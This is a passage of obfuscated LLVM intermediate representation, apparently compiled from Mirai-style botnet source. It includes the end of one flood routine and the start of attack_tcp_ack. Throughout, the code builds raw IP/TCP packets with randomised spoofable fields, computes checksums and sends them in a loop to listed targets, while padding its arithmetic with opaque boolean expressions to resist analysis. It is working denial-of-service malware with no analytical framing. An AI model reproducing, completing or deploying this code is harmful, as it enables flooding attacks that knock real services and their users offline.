  %388 = xor i16 %381, %387
  %389 = and i16 %388, %381
  %390 = and i16 %381, -257
  %391 = xor i16 %389, -1
  %392 = xor i16 %386, -1
  %393 = xor i16 18494, -1
  %394 = and i16 %391, 18494
  %395 = and i16 %389, %393
  %396 = and i16 %392, 18494
  %397 = and i16 %386, %393
  %398 = or i16 %394, %395
  %399 = or i16 %396, %397
  %400 = xor i16 %398, %399
  %401 = or i16 %391, %392
  %402 = xor i16 %401, -1
  %403 = or i16 18494, %393
  %404 = and i16 %402, %403
  %405 = or i16 %400, %404
  %406 = or i16 %389, %386
  store i16 %405, i16* %380, align 4
  %407 = load i8*, i8** %29, align 8
  %408 = getelementptr inbounds i8, i8* %407, i32 1
  store i8* %408, i8** %29, align 8
  store i8 2, i8* %407, align 1
  %409 = load i8*, i8** %29, align 8
  %410 = getelementptr inbounds i8, i8* %409, i32 1
  store i8* %410, i8** %29, align 8
  store i8 4, i8* %409, align 1
  %411 = call i32 @rand_next()
  %412 = xor i32 15, -1
  %413 = xor i32 %411, %412
  %414 = and i32 %413, %411
  %415 = and i32 %411, 15
  %416 = sub i32 1400, -1234161463
  %417 = add i32 %416, %414
  %418 = add i32 %417, -1234161463
  %419 = add i32 1400, %414
  %420 = trunc i32 %418 to i16
  %421 = call zeroext i16 @htons(i16 zeroext %420) #7
  %422 = load i8*, i8** %29, align 8
  %423 = bitcast i8* %422 to i16*
  store i16 %421, i16* %423, align 2
  %424 = load i8*, i8** %29, align 8
  %425 = getelementptr inbounds i8, i8* %424, i64 2
  store i8* %425, i8** %29, align 8
  %426 = load i8*, i8** %29, align 8
  %427 = getelementptr inbounds i8, i8* %426, i32 1
  store i8* %427, i8** %29, align 8
  store i8 4, i8* %426, align 1
  %428 = load i8*, i8** %29, align 8
  %429 = getelementptr inbounds i8, i8* %428, i32 1
  store i8* %429, i8** %29, align 8
  store i8 2, i8* %428, align 1
  %430 = load i8*, i8** %29, align 8
  %431 = getelementptr inbounds i8, i8* %430, i32 1
  store i8* %431, i8** %29, align 8
  store i8 8, i8* %430, align 1
  %432 = load i8*, i8** %29, align 8
  %433 = getelementptr inbounds i8, i8* %432, i32 1
  store i8* %433, i8** %29, align 8
  store i8 10, i8* %432, align 1
  %434 = call i32 @rand_next()
  %435 = load i8*, i8** %29, align 8
  %436 = bitcast i8* %435 to i32*
  store i32 %434, i32* %436, align 4
  %437 = load i8*, i8** %29, align 8
  %438 = getelementptr inbounds i8, i8* %437, i64 4
  store i8* %438, i8** %29, align 8
  %439 = load i8*, i8** %29, align 8
  %440 = bitcast i8* %439 to i32*
  store i32 0, i32* %440, align 4
  %441 = load i8*, i8** %29, align 8
  %442 = getelementptr inbounds i8, i8* %441, i64 4
  store i8* %442, i8** %29, align 8
  %443 = load i8*, i8** %29, align 8
  %444 = getelementptr inbounds i8, i8* %443, i32 1
  store i8* %444, i8** %29, align 8
  store i8 1, i8* %443, align 1
  %445 = load i8*, i8** %29, align 8
  %446 = getelementptr inbounds i8, i8* %445, i32 1
  store i8* %446, i8** %29, align 8
  store i8 3, i8* %445, align 1
  %447 = load i8*, i8** %29, align 8
  %448 = getelementptr inbounds i8, i8* %447, i32 1
  store i8* %448, i8** %29, align 8
  store i8 3, i8* %447, align 1
  %449 = load i8*, i8** %29, align 8
  %450 = getelementptr inbounds i8, i8* %449, i32 1
  store i8* %450, i8** %29, align 8
  store i8 6, i8* %449, align 1
  br label %451

; <label>:451:                                    ; preds = %188
  %452 = load i32, i32* %9, align 4
  %453 = add i32 %452, -684948505
  %454 = add i32 %453, 1
  %455 = sub i32 %454, -684948505
  %456 = add nsw i32 %452, 1
  store i32 %455, i32* %9, align 4
  br label %108

; <label>:457:                                    ; preds = %108
  br label %458

; <label>:458:                                    ; preds = %628, %457
  store i32 0, i32* %9, align 4
  br label %459

; <label>:459:                                    ; preds = %622, %458
  %460 = load i32, i32* %9, align 4
  %461 = load i8, i8* %5, align 1
  %462 = zext i8 %461 to i32
  %463 = icmp slt i32 %460, %462
  br i1 %463, label %464, label %628

; <label>:464:                                    ; preds = %459
  %465 = load i8**, i8*** %11, align 8
  %466 = load i32, i32* %9, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds i8*, i8** %465, i64 %467
  %469 = load i8*, i8** %468, align 8
  store i8* %469, i8** %30, align 8
  %470 = load i8*, i8** %30, align 8
  %471 = bitcast i8* %470 to %struct.iphdr*
  store %struct.iphdr* %471, %struct.iphdr** %31, align 8
  %472 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i64 1
  %474 = bitcast %struct.iphdr* %473 to %struct.tcphdr*
  store %struct.tcphdr* %474, %struct.tcphdr** %32, align 8
  %475 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %476 = load i32, i32* %9, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %475, i64 %477
  %479 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i32 0, i32 2
  %480 = load i8, i8* %479, align 4
  %481 = zext i8 %480 to i32
  %482 = icmp slt i32 %481, 32
  br i1 %482, label %483, label %508

; <label>:483:                                    ; preds = %464
  %484 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %485 = load i32, i32* %9, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i64 %486
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i32 0, i32 1
  %489 = load i32, i32* %488, align 4
  %490 = call i32 @ntohl(i32 %489) #7
  %491 = call i32 @rand_next()
  %492 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %493 = load i32, i32* %9, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %492, i64 %494
  %496 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %495, i32 0, i32 2
  %497 = load i8, i8* %496, align 4
  %498 = zext i8 %497 to i32
  %499 = lshr i32 %491, %498
  %500 = sub i32 0, %490
  %501 = sub i32 0, %499
  %502 = add i32 %500, %501
  %503 = sub i32 0, %502
  %504 = add i32 %490, %499
  %505 = call i32 @htonl(i32 %503) #7
  %506 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 9
  store i32 %505, i32* %507, align 4
  br label %508

; <label>:508:                                    ; preds = %483, %464
  %509 = load i32, i32* %26, align 4
  %510 = icmp eq i32 %509, -1
  br i1 %510, label %511, label %515

; <label>:511:                                    ; preds = %508
  %512 = call i32 @rand_next()
  %513 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 8
  store i32 %512, i32* %514, align 4
  br label %515

; <label>:515:                                    ; preds = %511, %508
  %516 = load i16, i16* %13, align 2
  %517 = zext i16 %516 to i32
  %518 = icmp eq i32 %517, 65535
  br i1 %518, label %519, label %528

; <label>:519:                                    ; preds = %515
  %520 = call i32 @rand_next()
  %521 = xor i32 65535, -1
  %522 = xor i32 %520, %521
  %523 = and i32 %522, %520
  %524 = and i32 %520, 65535
  %525 = trunc i32 %523 to i16
  %526 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 3
  store i16 %525, i16* %527, align 4
  br label %528

; <label>:528:                                    ; preds = %519, %515
  %529 = load i16, i16* %16, align 2
  %530 = zext i16 %529 to i32
  %531 = icmp eq i32 %530, 65535
  br i1 %531, label %532, label %541

; <label>:532:                                    ; preds = %528
  %533 = call i32 @rand_next()
  %534 = xor i32 65535, -1
  %535 = xor i32 %533, %534
  %536 = and i32 %535, %533
  %537 = and i32 %533, 65535
  %538 = trunc i32 %536 to i16
  %539 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 0
  store i16 %538, i16* %540, align 4
  br label %541

; <label>:541:                                    ; preds = %532, %528
  %542 = load i16, i16* %17, align 2
  %543 = zext i16 %542 to i32
  %544 = icmp eq i32 %543, 65535
  br i1 %544, label %545, label %558

; <label>:545:                                    ; preds = %541
  %546 = call i32 @rand_next()
  %547 = xor i32 %546, -1
  %548 = xor i32 65535, -1
  %549 = xor i32 943639958, -1
  %550 = or i32 %547, %548
  %551 = or i32 943639958, %549
  %552 = xor i32 %550, -1
  %553 = and i32 %552, %551
  %554 = and i32 %546, 65535
  %555 = trunc i32 %553 to i16
  %556 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 1
  store i16 %555, i16* %557, align 2
  br label %558

; <label>:558:                                    ; preds = %545, %541
  %559 = load i32, i32* %18, align 4
  %560 = icmp eq i32 %559, 65535
  br i1 %560, label %561, label %565

; <label>:561:                                    ; preds = %558
  %562 = call i32 @rand_next()
  %563 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %564 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %563, i32 0, i32 2
  store i32 %562, i32* %564, align 4
  br label %565

; <label>:565:                                    ; preds = %561, %558
  %566 = load i32, i32* %19, align 4
  %567 = icmp eq i32 %566, 65535
  br i1 %567, label %568, label %572

; <label>:568:                                    ; preds = %565
  %569 = call i32 @rand_next()
  %570 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 3
  store i32 %569, i32* %571, align 4
  br label %572

; <label>:572:                                    ; preds = %568, %565
  %573 = load i8, i8* %20, align 1
  %574 = icmp ne i8 %573, 0
  br i1 %574, label %575, label %584

; <label>:575:                                    ; preds = %572
  %576 = call i32 @rand_next()
  %577 = xor i32 65535, -1
  %578 = xor i32 %576, %577
  %579 = and i32 %578, %576
  %580 = and i32 %576, 65535
  %581 = trunc i32 %579 to i16
  %582 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %583 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %582, i32 0, i32 7
  store i16 %581, i16* %583, align 2
  br label %584

; <label>:584:                                    ; preds = %575, %572
  %585 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 7
  store i16 0, i16* %586, align 2
  %587 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %588 = bitcast %struct.iphdr* %587 to i16*
  %589 = call zeroext i16 @checksum_generic(i16* %588, i32 20)
  %590 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %591 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %590, i32 0, i32 7
  store i16 %589, i16* %591, align 2
  %592 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %593 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %592, i32 0, i32 6
  store i16 0, i16* %593, align 4
  %594 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %595 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %596 = bitcast %struct.tcphdr* %595 to i8*
  %597 = call zeroext i16 @htons(i16 zeroext 40) #7
  %598 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %594, i8* %596, i16 zeroext %597, i32 40)
  %599 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %600 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %599, i32 0, i32 6
  store i16 %598, i16* %600, align 4
  %601 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %602 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %601, i32 0, i32 1
  %603 = load i16, i16* %602, align 2
  %604 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %605 = load i32, i32* %9, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i64 %606
  %608 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %607, i32 0, i32 0
  %609 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %608, i32 0, i32 1
  store i16 %603, i16* %609, align 2
  %610 = load i32, i32* %10, align 4
  %611 = load i8*, i8** %30, align 8
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = bitcast %struct.sockaddr_in* %617 to %struct.sockaddr*
  store %struct.sockaddr* %618, %struct.sockaddr** %612, align 8
  %619 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %620 = load %struct.sockaddr*, %struct.sockaddr** %619, align 8
  %621 = call i64 @sendto(i32 %610, i8* %611, i64 60, i32 16384, %struct.sockaddr* %620, i32 16)
  br label %622

; <label>:622:                                    ; preds = %584
  %623 = load i32, i32* %9, align 4
  %624 = sub i32 %623, 855114421
  %625 = add i32 %624, 1
  %626 = add i32 %625, 855114421
  %627 = add nsw i32 %623, 1
  store i32 %626, i32* %9, align 4
  br label %459

; <label>:628:                                    ; preds = %459
  br label %458

; <label>:629:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %655

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %655

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %465, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %472

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 %143, -1
  %145 = xor i8 15, -1
  %146 = xor i8 -35, -1
  %147 = or i8 %144, %145
  %148 = or i8 -35, %146
  %149 = xor i8 %147, -1
  %150 = and i8 %149, %148
  %151 = and i8 %143, 15
  %152 = and i8 %150, 64
  %153 = xor i8 %150, 64
  %154 = or i8 %152, %153
  %155 = or i8 %150, 64
  store i8 %154, i8* %142, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %157 = bitcast %struct.iphdr* %156 to i8*
  %158 = load i8, i8* %157, align 4
  %159 = xor i8 %158, -1
  %160 = xor i8 -16, -1
  %161 = xor i8 5, -1
  %162 = or i8 %159, %160
  %163 = or i8 5, %161
  %164 = xor i8 %162, -1
  %165 = and i8 %164, %163
  %166 = and i8 %158, -16
  %167 = and i8 %165, 5
  %168 = xor i8 %165, 5
  %169 = or i8 %167, %168
  %170 = or i8 %165, 5
  store i8 %169, i8* %157, align 4
  %171 = load i8, i8* %12, align 1
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 1
  store i8 %171, i8* %173, align 1
  %174 = load i32, i32* %26, align 4
  %175 = sext i32 %174 to i64
  %176 = add i64 40, 5816217771924729041
  %177 = add i64 %176, %175
  %178 = sub i64 %177, 5816217771924729041
  %179 = add i64 40, %175
  %180 = trunc i64 %178 to i16
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = load i16, i16* %13, align 2
  %185 = call zeroext i16 @htons(i16 zeroext %184) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 3
  store i16 %185, i16* %187, align 4
  %188 = load i8, i8* %14, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 5
  store i8 %188, i8* %190, align 4
  %191 = load i8, i8* %15, align 1
  %192 = icmp ne i8 %191, 0
  br i1 %192, label %193, label %197

; <label>:193:                                    ; preds = %123
  %194 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 4
  store i16 %194, i16* %196, align 2
  br label %197

; <label>:197:                                    ; preds = %193, %123
  %198 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 6
  store i8 6, i8* %199, align 1
  %200 = load i32, i32* %28, align 4
  %201 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 8
  store i32 %200, i32* %202, align 4
  %203 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i32 0, i32 1
  %208 = load i32, i32* %207, align 4
  %209 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 9
  store i32 %208, i32* %210, align 4
  %211 = load i16, i16* %16, align 2
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  store i16 %212, i16* %214, align 4
  %215 = load i16, i16* %17, align 2
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 1
  store i16 %216, i16* %218, align 2
  %219 = load i32, i32* %18, align 4
  %220 = trunc i32 %219 to i16
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = zext i16 %221 to i32
  %223 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %224 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %223, i32 0, i32 2
  store i32 %222, i32* %224, align 4
  %225 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = xor i16 %227, -1
  %229 = xor i16 -241, -1
  %230 = xor i16 12063, -1
  %231 = or i16 %228, %229
  %232 = or i16 12063, %230
  %233 = xor i16 %231, -1
  %234 = and i16 %233, %232
  %235 = and i16 %227, -241
  %236 = xor i16 %234, -1
  %237 = xor i16 80, -1
  %238 = xor i16 -15408, -1
  %239 = and i16 %236, -15408
  %240 = and i16 %234, %238
  %241 = and i16 %237, -15408
  %242 = and i16 80, %238
  %243 = or i16 %239, %240
  %244 = or i16 %241, %242
  %245 = xor i16 %243, %244
  %246 = or i16 %236, %237
  %247 = xor i16 %246, -1
  %248 = or i16 -15408, %238
  %249 = and i16 %247, %248
  %250 = or i16 %245, %249
  %251 = or i16 %234, 80
  store i16 %250, i16* %226, align 4
  %252 = load i8, i8* %20, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = xor i16 %253, -1
  %258 = xor i16 1, -1
  %259 = xor i16 -30455, -1
  %260 = or i16 %257, %258
  %261 = or i16 -30455, %259
  %262 = xor i16 %260, -1
  %263 = and i16 %262, %261
  %264 = and i16 %253, 1
  %265 = shl i16 %263, 13
  %266 = xor i16 %256, -1
  %267 = xor i16 -8193, -1
  %268 = xor i16 -21059, -1
  %269 = or i16 %266, %267
  %270 = or i16 -21059, %268
  %271 = xor i16 %269, -1
  %272 = and i16 %271, %270
  %273 = and i16 %256, -8193
  %274 = and i16 %272, %265
  %275 = xor i16 %272, %265
  %276 = or i16 %274, %275
  %277 = or i16 %272, %265
  store i16 %276, i16* %255, align 4
  %278 = load i8, i8* %21, align 1
  %279 = sext i8 %278 to i16
  %280 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = xor i16 %279, -1
  %284 = xor i16 1, -1
  %285 = xor i16 -6611, -1
  %286 = or i16 %283, %284
  %287 = or i16 -6611, %285
  %288 = xor i16 %286, -1
  %289 = and i16 %288, %287
  %290 = and i16 %279, 1
  %291 = shl i16 %289, 12
  %292 = xor i16 %282, -1
  %293 = xor i16 -4097, -1
  %294 = xor i16 14884, -1
  %295 = or i16 %292, %293
  %296 = or i16 14884, %294
  %297 = xor i16 %295, -1
  %298 = and i16 %297, %296
  %299 = and i16 %282, -4097
  %300 = xor i16 %298, -1
  %301 = xor i16 %291, -1
  %302 = xor i16 13057, -1
  %303 = and i16 %300, 13057
  %304 = and i16 %298, %302
  %305 = and i16 %301, 13057
  %306 = and i16 %291, %302
  %307 = or i16 %303, %304
